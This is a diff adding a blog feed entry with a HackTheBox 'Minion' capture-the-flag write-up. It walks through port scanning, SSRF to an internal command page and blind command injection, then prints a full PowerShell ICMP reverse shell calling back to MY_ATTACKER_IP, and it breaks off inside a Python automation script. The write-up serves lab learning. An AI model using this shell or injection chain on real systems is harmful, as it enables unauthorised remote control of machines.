@@ -5,9 +5,325 @@
     <description>Adventures in the Infosec world.</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Sat, 10 Mar 2018 00:35:00 -0800</pubDate>
-    <lastBuildDate>Sat, 10 Mar 2018 00:35:00 -0800</lastBuildDate>
+    <pubDate>Wed, 21 Mar 2018 12:38:18 -0700</pubDate>
+    <lastBuildDate>Wed, 21 Mar 2018 12:38:18 -0700</lastBuildDate>
     <generator>Jekyll v3.6.2</generator>
+    
+      <item>
+        <title>HackTheBox - Minion</title>
+        <description>&lt;h2 id=&quot;service-scanning&quot;&gt;Service Scanning&lt;/h2&gt;
+
+&lt;p&gt;Starting with:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;nmap -T4 -Pn -oA nmap/initial_scan 10.10.10.57&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;This scan didn’t return any open port. I then executed a wider scan, on all possible TCP ports:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;nmap -T4 -Pn -p- -oA nmap/second_scan 10.10.10.57&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Only a open TCP port was reported:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;PORT      STATE SERVICE
+62696/tcp open  unknown&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Scanning for its version with &lt;code&gt;nmap -sV -p62696 10.10.10.57&lt;/code&gt;, showed the follow information:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;PORT      STATE SERVICE VERSION
+62696/tcp open  http    Microsoft IIS httpd 8.5&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;As this seemed to be an IIS webserver, I fired my browser and went to 10.10.10.57:62696.&lt;/p&gt;
+
+&lt;h2 id=&quot;web-server-enumeration&quot;&gt;Web Server Enumeration&lt;/h2&gt;
+
+&lt;p&gt;I saw a website called “Welcome to Minions Fanclub Site!”. The visible content didn’t seem to be useful, so I decided to have a look at the HTML source code. I then quickly saw what looked to be a base64 value:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- TmVsIG1lenpvIGRlbCBjYW1taW4gZGkgbm9zdHJhIHZpdGENCm1pIHJpdHJvdmFpIHBlciB1bmEgc2VsdmEgb3NjdXJhLA0KY2jDqSBsYSBkaXJpdHRhIHZpYSBlcmEgc21hcnJpdGEu --&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I go ahead and decode the value and get the plain text value:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'TmVsIG1lenpvIGRlbCBjYW1taW4gZGkgbm9zdHJhIHZpdGENCm1pIHJpdHJvdmFpIHBlciB1bmEgc2VsdmEgb3NjdXJhLA0KY2jDqSBsYSBkaXJpdHRhIHZpYSBlcmEgc21hcnJpdGEu'&lt;/span&gt; |base64 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
+Nel mezzo del cammin di nostra vita
+mi ritrovai per una selva oscura,
+ché la diritta via era smarrita.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I was able to understand a bit of the Italian, but translated to English:&lt;/p&gt;
+
+&lt;pre&gt;
+In the middle of the walk of our life
+I found myself in a dark forest,
+because the straight way was lost.
+&lt;/pre&gt;
+
+&lt;p&gt;This text didn’t tell me anything straight away, so saved it and kept digging for more.&lt;/p&gt;
+
+&lt;p&gt;Going to &lt;code&gt;http://10.10.10.57:62696/robots.txt&lt;/code&gt;, I learned the directory /backend was disallowed. Going to &lt;code&gt;http://10.10.10.57:62696/backend/&lt;/code&gt; only resulted in the HTML response “Instance not running”.&lt;/p&gt;
+
+&lt;p&gt;To enumerate directories and files, I launched dirb:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;dirb http://10.10.10.57:62696 /usr/share/wordlists/dirb/common.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Other than the /backend directory, nothing else stood out. I went ahead and this time used gobuster. This way I could increase the number of threads, so it could be faster. I also used a couple of Microsoft Web related extensions:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;gobuster -t 50 -u http://10.10.10.57:62696/ -w /usr/share/wordlists/dirb/common.txt -x .asp,.txt,.bak,.sql,.aspx,.mdb,.log,.reg&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;This time, I got the file test.asp. After going to &lt;code&gt;http://10.10.10.57:62696/test.asp&lt;/code&gt;, I get a response saying “Missing Parameter Url [u] in GET request!”. At this time, I thought leveraging this to access any internal website. I went ahead and submitted the following request: &lt;code&gt;http://10.10.10.57:62696/test.asp?u=http://127.0.0.1&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;I got a Site Administration webpage, with a couple of useless links, but with a useful one saying “system commands”. This one linked to &lt;code&gt;http://127.0.0.1/cmd.aspx&lt;/code&gt;. I then requested &lt;code&gt;http://10.10.10.57:62696/test.asp?u=http://127.0.0.1/cmd.aspx&lt;/code&gt; and I got a textbox with label “Enter your shell command”. There was no submit button, but by pressing enter, the form would be submitted by POST to the same URL cmd.aspx. Because I was running these requests through the test.asp proxy, I couldn’t simply just submit the form on the browser, because it would submit it to &lt;code&gt;http://10.10.10.57:62696/cmd.aspx&lt;/code&gt; and that wouldn’t work. However, I just tried to submit a GET request and it worked! So submitting &lt;code&gt;http://10.10.10.57:62696/test.asp?u=http://127.0.0.1/cmd.aspx?xcmd=whoami&lt;/code&gt;, would give me a response HTML webpage with Exit Status=0 on its body. This revealed the command was successful, but I was not received the output of it. I was facing a blind OS command injection scenario.&lt;/p&gt;
+
+&lt;h2 id=&quot;getting-a-foothold&quot;&gt;Getting a Foothold&lt;/h2&gt;
+
+&lt;p&gt;Since this was a Windows machine, my first thought was to run a Powershell command to download and execute a meterpreter shell. Just to test it, I launched a webserver (python -m SimpleHTTPServer) on my attacking box and ran the command &lt;code&gt;powershell -c (new-object System.Net.WebClient).DownloadFile('http://MY_ATTACKER_IP','test_file.txt')&lt;/code&gt;. However, I didn’t get a connection back to my webserver. I tried a few variants of the command, bypassing the restriction policy (-exec bypass), URL encoding and double encoding, but nothing worked. I was always getting the Exit Status=1, which meant the command failed. I then launched a tcpdump on my machine and ran the ping command through the URL &lt;code&gt;http://10.10.10.57:62696/test.asp?u=http://127.0.0.1/cmd.aspx?xcmd=ping -c 3 MY_ATTACKER_IP&lt;/code&gt;. I got three ping requests on my tcpdump’s output! This meant the machine was only allowing ping network traffic (ICMP Echo Requests and Replies) and it seems I was restricted to use a ICMP shell.&lt;/p&gt;
+
+&lt;p&gt;After some research, I quickly found the &lt;a href=&quot;https://github.com/inquisb/icmpsh&quot;&gt;icmpsh shell&lt;/a&gt; and the Powershell client &lt;a href=&quot;https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1&quot;&gt;Invoke-PowershellShellIcmp.ps1&lt;/a&gt;. I used &lt;a href=&quot;https://pentestlab.blog/tag/icmpsh/&quot;&gt;this&lt;/a&gt; reference. The icmpsh I would run in my attacker box and the Invoke-PowerShellIcmp.ps1 on the target machine. Because I was not allowed to download any files, my only option was to build the file through the use of echo commands. My plan was once the file was built on the target system, I would launch a powershell command to execute it. After trying a few times manually, using Burp proxy, I decided to automate the process by writing a Python script. Then my nightmare started. I spent several days fighting with URL and shell encodings. I knew that I had to URL encode at least one time the value of parameter xcmd, however, I found out later, the value passed to the echo command, also needed some especial escaping. I used &lt;a href=&quot;https://sites.google.com/site/opensourceconstriubtions/ettl-martin-1/tutorials/how-to-escape-special-characters-in-windows-batch-files-when-using-echo&quot;&gt;this&lt;/a&gt; reference. The especial characters of the Powershell code of Invoke-PowerShellIcmp.ps1 were breaking the echo command and make the request return the Exit Status=1. I then decided that it would be easier to convert the Invoke-PonvwerShellIcmp.ps1 file to base64 and use that as the value for the echo commands. I also minimized the code in Invoke-PowerShellIcmp.ps1, by removing comments and blank lines. Also, to avoid having to run another Powershell command, I added Invoke-PowerShellIcmp MY_ATTACKER_IP to the end of Invoke-PowerShellIcmp.ps1. The final result was:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;Invoke-PowerShellIcmp
+&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;CmdletBinding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()]&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;Param&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Parameter&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Position &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0, Mandatory &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$IPAddress&lt;/span&gt;,
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Parameter&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Position &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1, Mandatory &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;Int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$Delay&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 5,
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Parameter&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Position &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2, Mandatory &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;Int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$BufferSize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 128
+&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ICMPClient&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;New-Object &lt;/span&gt;System.Net.NetworkInformation.Ping
+&lt;span class=&quot;nv&quot;&gt;$PingOptions&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;New-Object &lt;/span&gt;System.Net.NetworkInformation.PingOptions
+&lt;span class=&quot;nv&quot;&gt;$PingOptions&lt;/span&gt;.DontFragment &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$True&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$sendbytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;text.encoding]::ASCII&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.GetBytes&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Windows PowerShell running as user &quot;&lt;/span&gt; + &lt;span class=&quot;nv&quot;&gt;$env&lt;/span&gt;:username + &lt;span class=&quot;s2&quot;&gt;&quot; on &quot;&lt;/span&gt; + &lt;span class=&quot;nv&quot;&gt;$env&lt;/span&gt;:computername + &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;`n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Copyright (C) 2015 Microsoft Corporation. All rights reserved.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;`n`n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ICMPClient&lt;/span&gt;.Send&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$IPAddress&lt;/span&gt;,60 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; 1000, &lt;span class=&quot;nv&quot;&gt;$sendbytes&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$PingOptions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Out-Null
+&lt;span class=&quot;nv&quot;&gt;$sendbytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;text.encoding]::ASCII&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.GetBytes&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'PS '&lt;/span&gt; + &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Get-Location&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.Path + &lt;span class=&quot;s1&quot;&gt;'&amp;gt; '&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ICMPClient&lt;/span&gt;.Send&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$IPAddress&lt;/span&gt;,60 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; 1000, &lt;span class=&quot;nv&quot;&gt;$sendbytes&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$PingOptions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Out-Null
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$sendbytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;text.encoding]::ASCII&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.GetBytes&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$reply&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ICMPClient&lt;/span&gt;.Send&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$IPAddress&lt;/span&gt;,60 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; 1000, &lt;span class=&quot;nv&quot;&gt;$sendbytes&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$PingOptions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$reply&lt;/span&gt;.Buffer&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;text.encoding]::ASCII&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.GetString&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$reply&lt;/span&gt;.Buffer&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Invoke-Expression&lt;/span&gt; -Command &lt;span class=&quot;nv&quot;&gt;$response&lt;/span&gt; 2&amp;gt;&amp;amp;1 | &lt;span class=&quot;nb&quot;&gt;Out-String&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$sendbytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;text.encoding]::ASCII&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.GetBytes&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;math]::floor&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sendbytes&lt;/span&gt;.length/&lt;span class=&quot;nv&quot;&gt;$BufferSize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sendbytes&lt;/span&gt;.length -gt &lt;span class=&quot;nv&quot;&gt;$BufferSize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt; -lt &lt;span class=&quot;nv&quot;&gt;$index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$sendbytes2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sendbytes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BufferSize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;..&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;+1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BufferSize&lt;/span&gt;-1&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ICMPClient&lt;/span&gt;.Send&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$IPAddress&lt;/span&gt;,60 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; 10000, &lt;span class=&quot;nv&quot;&gt;$sendbytes2&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$PingOptions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Out-Null
+&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt; +&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$remainingindex&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sendbytes&lt;/span&gt;.Length % &lt;span class=&quot;nv&quot;&gt;$BufferSize&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$remainingindex&lt;/span&gt; -ne 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$sendbytes2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sendbytes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BufferSize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;..&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sendbytes&lt;/span&gt;.Length&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ICMPClient&lt;/span&gt;.Send&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$IPAddress&lt;/span&gt;,60 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; 10000, &lt;span class=&quot;nv&quot;&gt;$sendbytes2&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$PingOptions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Out-Null
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ICMPClient&lt;/span&gt;.Send&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$IPAddress&lt;/span&gt;,60 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; 10000, &lt;span class=&quot;nv&quot;&gt;$sendbytes&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$PingOptions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Out-Null
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$sendbytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;text.encoding]::ASCII&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.GetBytes&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;`n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;PS &quot;&lt;/span&gt; + &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Get-Location&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.Path + &lt;span class=&quot;s1&quot;&gt;'&amp;gt; '&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ICMPClient&lt;/span&gt;.Send&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$IPAddress&lt;/span&gt;,60 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; 1000, &lt;span class=&quot;nv&quot;&gt;$sendbytes&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$PingOptions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Out-Null
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;Start-Sleep&lt;/span&gt; -Seconds &lt;span class=&quot;nv&quot;&gt;$Delay&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+invoke-powershellicmp MY_ATTACKER_IP&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;After running &lt;code&gt;base64 Invoke-PowerShellIcmp.ps1 &amp;gt; Invoke-PowerShellIcmp.b64&lt;/code&gt;, I wrote the following Python 2 script that automates the process:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
+
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;urllib2&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;urllib&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;re&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;send_request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urlopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;content&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
